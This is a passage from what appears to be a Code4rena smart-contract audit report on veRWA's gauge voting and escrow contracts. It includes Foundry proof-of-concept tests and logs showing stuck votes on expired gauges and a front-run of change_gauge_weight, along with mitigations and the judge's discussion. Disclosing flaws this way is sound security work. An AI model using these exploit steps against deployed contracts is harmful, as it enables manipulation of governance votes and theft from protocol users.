class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Used too much power&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// cannot remove vote for gauge1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Invalid gauge address&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit remove when mitigate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// cannot vote for gauge2 (to demonstrate again that voting power is not removed)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Used too much power&quot;</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">// @audit remove when mitigate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n</details>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools used</h3>\n<p>Forge</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended mitigation steps</h3>\n<p>The simplest way to mitigate this is to <strong>allow zero-weight votings on expired pools</strong> simply to remove the vote. Modify line 213 as follow:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user_weight</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">isValidGauge</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_gauge_addr</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;Can only vote 0 on non-gauges&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213\">https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213</a></p>\n<p>The given POC can then be the test case to verify successful mitigation.</p>\n<p>As a QA-based recommendation, the sponsor can also provide an external function to remove votes, and/or provide a function to vote for various pools in the same tx. This will allow users to channel their votes directly from removed pools to ongoing pools.</p>\n<hr>\n<h1 id=\"medium-risk-findings-3\" style=\"position:relative;\"><a href=\"#medium-risk-findings-3\" aria-label=\"medium risk findings 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (3)</h1>\n<h2 id=\"m-01-users-can-front-run-calls-to-change_gauge_weight-to-gain-extra-voting-power\" style=\"position:relative;\"><a href=\"#m-01-users-can-front-run-calls-to-change_gauge_weight-to-gain-extra-voting-power\" aria-label=\"m 01 users can front run calls to change_gauge_weight to gain extra voting power permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/294\">[M-01] Users can front-run calls to <code>change_gauge_weight</code> to gain extra voting power</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/294\">deadrxsezzz</a></em></p>\n<p>Users can get extra voting power by front-running calls to <code>change_gauge_weight</code>.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>It can be expected that in some cases calls will be made to <code>change_gauge_weight</code> to increase or decrease a gauge’s weight. The problem is users can be monitoring the mempool expecting such calls. Upon seeing such, any people who have voted for said gauge can just remove their vote prior to <code>change_gauge_weight</code>. Once it executes, they can vote again for their gauge, increasing its weight more than it was expected to be:\nExample:</p>\n<ol>\n<li>Gauge has 1 user who has voted and contributed for 10_000 weight</li>\n<li>They see an admin calling <code>change_gauge_weight</code> with value 15_000.</li>\n<li>User front-runs it and removes all their weight. Gauge weight is now 0.</li>\n<li>Admin function executes. Gauge weight is now 15_000</li>\n<li>User votes once again for the gauge for the same initial 10_000 weight. Gauge weight is now 25_000.</li>\n</ol>\n<p>Gauge weight was supposed to be changed from 10_000 to 15_000, but due to the user front-running, gauge weight is now 25_000.</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Instead of having a set function, use increase/ decrease methods.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/294#issuecomment-1696444632\">alcueca (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Votes are only counted at the first second of an epoch, front-running <code>change_gauge_weight</code> won’t do anything.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/294#issuecomment-1697283221\">deadrxsezzz (Warden) commented</a>:</strong></p>\n<blockquote>\n<p>Hey, I’m leaving a simple PoC showcasing the issue and the respective logs from it:</p>\n</blockquote>\n<details>\n<blockquote>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testWithFrontRun</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createLock</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;gauge&#39;s weight after voting: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// front-run transaction by user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000000000000000000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// back-run</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;gauge&#39;s weight after changing weight: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testWithoutFrontRun</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createLock</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;gauge&#39;s weight after voting: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1000000000000000000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;gauge&#39;s weight after government changes weight: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testWithFrontRun() (gas: 702874)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  gauge&#39;s weight after voting:  993424657416307200</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  gauge&#39;s weight after changing weight:  1993424657416307200</span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testWithoutFrontRun() (gas: 674264)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  gauge&#39;s weight after voting:  993424657416307200</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  gauge&#39;s weight after government changes weight:  1000000000000000000</span></span></code></pre>\n</blockquote>\n</details>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/294#issuecomment-1698572717\">OpenCoreCH (veRWA) commented</a>:</strong></p>\n<blockquote>\n<p>In practice the function should only be used to set the weights to 0 (e.g., when a market got exploited and not all users withdrew their votes yet). But there is nothing that prevents it from setting it to a higher or lower value (at least not in the audited codebase, added that in the meantime). So what is described in the finding is generally true, although it does not require frontrunning or anything like that, because the function just changes the current voting result, anyway. So if voting for the market is not restricted afterwards (by removing it from the whitelist), people can continue to vote on it and the final vote result may be different than what governance has set with this function.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/294#issuecomment-1698576798\">alcueca (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>From what I understand the function is essentially broken, and a Medium severity is appropriate given that wardens can’t assume that it will be used only to set the weights to 0 for non-whitelisted markets.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/401\">OpenCoreCH (veRWA) confirmed on duplicate 401</a></strong></p>\n<hr>\n<h2 id=\"m-02-upon-increaseamount-the-lock-may-not-align-to-the-nearest-weekly-increment\" style=\"position:relative;\"><a href=\"#m-02-upon-increaseamount-the-lock-may-not-align-to-the-nearest-weekly-increment\" aria-label=\"m 02 upon increaseamount the lock may not align to the nearest weekly increment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/145\">[M-02] Upon IncreaseAmount the lock may not align to the nearest weekly increment</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/145\">gzeon</a></em></p>\n<p><em>Note: This audit was preceded by a <a href=\"https://code4rena.com/test-coverage\">Code4rena Test Coverage competition</a>. While auditing was not the purpose of the testing phase, relevant and valuable findings reported during that phase were eligible to be judged. This finding [M-02] was discovered during that period and is being included here for completeness.</em></p>\n<p>In most other places, locks are created with the end time rounded down to nearest weekly increment using the <code>_floorToWeek</code> function.</p>\n<p><a href=\"https://github.com/OpenCoreCH/test-squad-verwa/blob/461b7d99a30e8fee57ba97c2262f6b0c5e4704b6/src/VotingEscrow.sol#L422-L426\">https://github.com/OpenCoreCH/test-squad-verwa/blob/461b7d99a30e8fee57ba97c2262f6b0c5e4704b6/src/VotingEscrow.sol#L422-L426</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// @dev Floors a timestamp to the nearest weekly increment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// @param _t Timestamp to floor</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_floorToWeek</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_t</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_t</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>However in IncreaseAmount, it is simply set to <code>block.timestamp + LOCKTIME</code> without the rounding:</p>\n<p><a 